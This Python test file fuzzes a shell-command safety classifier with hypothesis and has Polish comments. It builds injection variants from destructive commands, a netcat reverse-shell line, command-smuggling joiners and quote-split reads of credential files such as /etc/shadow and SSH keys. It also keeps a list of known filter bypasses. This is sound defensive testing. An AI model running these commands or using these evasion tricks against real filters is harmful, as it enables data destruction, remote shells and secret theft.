"""
Fuzzing klasyfikatora komend (core/security.py) — testy wlasciwosci (hypothesis).

Reczne przypadki (test_security*.py) pilnuja znanych obejsc; tu generujemy tysiace wariantow i sprawdzamy
jedna obietnice: nic, co moze zmienic stan serwera albo wyslac sekret do modelu, nie jest `safe`.
Kazdy znaleziony kontrprzyklad trafia na liste KNOWN_BYPASSES na dole jako stala regresja.
"""

import os
import shlex

import pytest

hypothesis = pytest.importorskip("hypothesis")
from hypothesis import HealthCheck, given, settings, strategies as st  # noqa: E402

from backend.core.security import SAFE_PREFIXES, classify_command, split_command  # noqa: E402

# Glebsze szukanie lokalnie: PIPE_FUZZ_EXAMPLES=5000 pytest backend/tests/test_security_fuzz.py
FUZZ = settings(max_examples=int(os.getenv("PIPE_FUZZ_EXAMPLES", "300")), deadline=None,
                suppress_health_check=[HealthCheck.too_slow])

# Rozpoznane odczyty — od nich zaczyna sie kazda proba obejscia.
SAFE_HEADS = st.sampled_from(sorted(SAFE_PREFIXES))

# Argumenty bez metaznakow powloki (same w sobie nie powinny niczego przemycac).
PLAIN_ARG = st.text(alphabet="abcdefghijklmnopqrstuvwxyz0123456789-_./=", min_size=1, max_size=12)
PLAIN_ARGS = st.lists(PLAIN_ARG, max_size=3).map(" ".join)

# Komendy, ktore zmieniaja stan (albo uruchamiaja dowolny program).
WRITERS = st.sampled_from([
    "rm -rf /var/www", "touch /tmp/x", "mkdir /tmp/x", "systemctl restart nginx", "reboot", "kill 1",
    "chmod 777 /etc", "docker run --rm alpine", "docker exec web sh", "apt install nc", "pip install x",
    "sh -c id", "bash", "python3 -c 1", "nc -e /bin/sh 1.2.3.4 9", "tee /etc/cron.d/x", "xargs rm",
    "sed -i s/a/b/ /etc/hosts", "dd of=/dev/sda", "git push", "kubectl delete pod x", "crontab -r",
    "useradd evil", "mv /etc/a /etc/b", "cp /bin/sh /tmp/sh", "perl -e 1", "awk BEGIN{system(1)}",
])

# Sposoby doklejenia drugiej komendy albo zapisu do pliku.
JOINERS = st.sampled_from([
    "; {w}", ";{w}", " && {w}", "&&{w}", " || {w}", " | {w}", "|{w}", " & {w}", "\n{w}", "\r\n{w}",
    " $({w})", "$({w})", " `{w}`", " <({w})", " >({w})", " > /etc/x", " >> /root/.bashrc", " >/tmp/x",
    " 1> /tmp/x", " &> /tmp/x", " >| /tmp/x", " ${{IFS}}{w}", " $'\\x3b'{w}",
])

SENSITIVE_PATHS = st.sampled_from([
    "/etc/shadow", "/etc/gshadow", "/root/.ssh/id_rsa", "/home/kuba/.ssh/id_ed25519", "/app/.env",
    "/srv/app/.env.production", "/proc/1/environ", "/proc/self/environ", "/hostproc/1/environ",
    "/etc/ssl/private/server.key", "/etc/ssh/ssh_host_ed25519_key", "/app/data/llm_keys.json",
])
READERS = st.sampled_from(["cat", "head", "tail", "grep -r x", "less -f", "zcat", "md5sum", "diff /dev/null",
                           "jq .", "sort", "wc -c", "stat", "strings"])


def _split_quotes(text: str, cut: int, style: str) -> str:
    """Rozcina tekst na dwie czesci w cudzyslowach — powloka skleja je z powrotem w ten sam napis."""
    cut = max(1, min(cut, len(text) - 1))
    left, right = text[:cut], text[cut:]
    if style == "single":
        return f"'{left}''{right}'"
    if style == "double":
        return f'"{left}""{right}"'
    if style == "mixed":
        return f"'{left}'\"{right}\""
    return f"{left}\\{right}" if right[0].isalnum() else left + right


@FUZZ
@given(head=SAFE_HEADS, args=PLAIN_ARGS, joiner=JOINERS, writer=WRITERS)
def test_safe_read_plus_injected_command_is_never_safe(head, args, joiner, writer):
    command = f"{head} {args}".rstrip() + joiner.format(w=writer)
    assert classify_command(command) != "safe", command


@FUZZ
@given(writer=WRITERS, cut=st.integers(1, 6), style=st.sampled_from(["single", "double", "mixed", "backslash"]))
def test_quoted_or_escaped_command_names_are_not_safe(writer, cut, style):
    name, _, rest = writer.partition(" ")
    command = (_split_quotes(name, cut, style) + " " + rest).strip()
    assert classify_command(command) != "safe", command


@FUZZ
@given(writer=WRITERS, upper=st.lists(st.booleans(), min_size=40, max_size=40),
       space=st.sampled_from([" ", "  ", "\t", " \t "]))
def test_case_and_whitespace_variants_are_not_safe(writer, upper, space):
    mixed = "".join(c.upper() if flag else c for c, flag in zip(writer.ljust(40), upper)).rstrip()
    command = space.join(mixed.split(" "))
    assert classify_command(command) != "safe", repr(command)


@FUZZ
@given(reader=READERS, path=SENSITIVE_PATHS, cut=st.integers(1, 12),
       style=st.sampled_from(["plain", "single", "double", "mixed"]))
def test_reading_secrets_always_asks(reader, path, cut, style):
    shown = path if style == "plain" else _split_quotes(path, cut, style)
    assert classify_command(f"{reader} {shown}") != "safe", f"{reader} {shown}"


@FUZZ
@given(head=SAFE_HEADS, args=PLAIN_ARGS, target=st.sampled_from(["/etc/x", "/root/.ssh/authorized_keys", "x", "/tmp/y"]),
       arrow=st.sampled_from([">", ">>", "1>", "2>", "&>", ">|", "1>>"]))
def test_write_redirects_are_never_safe(head, args, target, arrow):
    command = f"{head} {args} {arrow} {target}".replace("  ", " ")
    assert classify_command(command) != "safe", command


@FUZZ
@given(text=st.text(max_size=200))
def test_never_crashes_on_arbitrary_text(text):
    assert classify_command(text) in ("safe", "confirm", "forbidden")
    segments, _writes, _dynamic = split_command(text)
    assert isinstance(segments, list)


@FUZZ
@given(head=SAFE_HEADS, args=PLAIN_ARGS)
def test_quoted_separators_stay_inside_the_argument(head, args):
    """Srednik w cudzyslowie to tekst, nie druga komenda — klasyfikacja jak dla zwyklego argumentu."""
    plain = f"{head} {args}".rstrip()
    quoted = f"{plain} {shlex.quote('a;b|c&&d')}"
    segments, writes, dynamic = split_command(quoted)
    assert len(segments) == 1 and not writes and not dynamic


# Kontrprzyklady znalezione przez fuzzing albo recznie — zostaja jako regresje.
KNOWN_BYPASSES = [
    "ls $'\\x3b' rm -rf /tmp/x",
    "cat /etc/sh''adow",
    "cat '/etc/'\"shadow\"",
    "echo ok >| /etc/cron.d/x",
    "grep -r x . &>/tmp/out",
    "ps aux\r\nreboot",
]


@pytest.mark.parametrize("command", KNOWN_BYPASSES)
def test_known_bypasses_stay_closed(command):
    assert classify_command(command) != "safe", command
